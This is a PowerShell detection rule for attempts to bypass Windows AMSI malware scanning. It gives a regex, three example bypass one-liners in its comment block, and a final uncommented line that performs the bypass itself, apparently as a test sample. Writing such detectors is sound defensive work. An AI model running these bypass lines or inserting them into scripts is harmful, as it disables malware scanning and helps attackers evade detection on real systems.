<#
.SYNOPSIS
AMSI bypass technique detection

.DESCRIPTION
Detects attempts to bypass Windows Anti-Malware Scan Interface (AMSI) using PowerShell. AMSI bypass is commonly used by attackers to evade detection when executing malicious PowerShell scripts and payloads.

.SEVERITY
critical

.CATEGORY
obfuscation

.SCORE
95

.REGEX
\[Ref\]\.Assembly\.GetType.*AmsiUtils|amsiInitFailed|AmsiScanBuffer|System\.Management\.Automation\.AmsiUtils|\$null.*amsi|amsi.*\$null

.FLAGS
i

.EXAMPLES
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
[System.Management.Automation.AmsiUtils]::GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
#>

# AMSI bypass technique example
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
